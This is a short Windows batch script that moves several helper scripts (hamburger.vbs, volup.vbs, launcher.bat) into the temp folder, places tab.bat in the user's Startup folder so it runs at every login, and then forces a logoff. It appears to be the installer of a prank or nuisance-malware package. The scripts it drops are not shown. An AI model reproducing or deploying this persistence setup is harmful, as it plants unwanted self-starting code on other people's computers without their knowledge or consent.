@echo off
move hamburger.vbs %temp%
move volup.vbs %temp%
move tab.bat "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
move launcher.bat %temp%
shutdown -l

